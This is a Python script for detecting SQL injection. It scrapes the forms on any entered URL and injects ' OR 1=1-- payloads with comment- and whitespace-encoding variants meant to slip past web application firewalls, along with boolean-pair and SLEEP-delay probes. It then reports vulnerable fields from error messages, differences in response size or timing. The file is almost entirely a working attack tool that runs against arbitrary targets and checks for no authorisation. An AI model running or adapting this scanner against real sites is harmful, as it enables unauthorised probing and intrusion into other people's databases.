import requests
from bs4 import BeautifulSoup
import sys
from requests.exceptions import ReadTimeout
from urllib.parse import urljoin
import time
import urllib.parse

s = requests.Session()
s.headers["User-Agnt"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"

# Function to get all forms
def get_forms(url):
    try:
        print("[*] Fetching:", url)
        res = s.get(url, timeout=10)
        print("[*] Status:", res.status_code)
        soup = BeautifulSoup(res.content, "html.parser")
        return soup.find_all("form")
    except ReadTimeout:
        print("[!] Request timed out — target is stalling automated clients")
        return []

def waf_payloads():
    base = "' OR 1=1--"
    return [
        base,
        "'/**/OR/**/1=1--",
        "' OR/**/1=1--",
        urllib.parse.quote(base),
        "'%09OR%091=1--",     
        "'%0aOR%0a1=1--",      
    ]
    
def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method","get")
    inputs = []
    
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type","text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value","")
        inputs.append({
            "type" : input_type,
            "name" : input_name,
            "value" : input_value,
        })
    
    detailsOfForm['action'] = action
    detailsOfForm['method'] = method
    detailsOfForm['inputs'] = inputs
    return detailsOfForm

def vulnerable(response):
    errors = {"quoted string not properly terminated",
              "unclosed quotation mark after the character string",
              "you have an error in your SQL syntax"   
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def time_based_sqli(url, details):
    delays = [3, 5]   # confirmation stages
    payloads = [
        "' OR SLEEP({})--",
        "'/**/OR/**/SLEEP({})--"
    ]

    for delay in delays:
        for payload_template in payloads:
            payload = payload_template.format(delay)

            for input_tag in details["inputs"]:
                if not input_tag["name"]:
                    continue

                data = {}
                for tag in details["inputs"]:
                    if tag["name"]:
                        data[tag["name"]] = "test"

                data[input_tag["name"]] += payload

                start = time.time()
                try:
                    if details["method"] == "post":
                        s.post(url, data=data, timeout=delay + 3)
                    else:
                        s.get(url, params=data, timeout=delay + 3)
                except ReadTimeout:
                    print(f"[!] Time-based SQLi confirmed (timeout {delay}s):", url)
                    return True

                elapsed = time.time() - start
                if elapsed >= delay:
                    print(f"[!] Time-based SQLi confirmed ({delay}s delay):", url)
                    return True

    return False

def boolean_based_sqli(url, details):
    false_payload = "' OR 1=2--"

    for payload in waf_payloads():
        for input_tag in details["inputs"]:
            if not input_tag["name"]:
                continue

            data_true = {}
            data_false = {}

            for tag in details["inputs"]:
                if tag["name"]:
                    data_true[tag["name"]] = "test"
                    data_false[tag["name"]] = "test"

            data_true[input_tag["name"]] += payload
            data_false[input_tag["name"]] += false_payload

            try:
                if details["method"] == "post":
                    r_true = s.post(url, data=data_true, timeout=10)
                    r_false = s.post(url, data=data_false, timeout=10)
                else:
                    r_true = s.get(url, params=data_true, timeout=10)
                    r_false = s.get(url, params=data_false, timeout=10)
            except ReadTimeout:
                continue

            if abs(len(r_true.text) - len(r_false.text)) > 50:
                print("[!] Boolean SQLi (WAF-evasion) detected:", url)
                return True

    return False


def sql_injection_scan(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")

    for form in forms:
        details = form_details(form)
        target_url = urljoin(url, details["action"])

        for payload in ("'", '"'):
            data = {}

            for input_tag in details["inputs"]:
                if not input_tag["name"]:
                    continue

                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag["name"]] = input_tag["value"] + payload
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = f"test{payload}"

            if details["method"].lower() == "post":
                res = s.post(target_url, data=data)
            else:
                res = s.get(target_url, params=data)

            if vulnerable(res):
                print("[!] SQL Injection vulnerability detected at:", target_url)
                return
        if boolean_based_sqli(target_url, details):
            return

        if time_based_sqli(target_url, details):
            return

    print("[-] No SQL injection vulnerability detected.")

        
if __name__ == "__main__":
    url = input("Enter target URL (include http/https): ").strip()

    if not url.startswith(("http://", "https://")):
        print("[!] Invalid URL. Must start with http:// or https://")
        sys.exit(1)

    sql_injection_scan(url)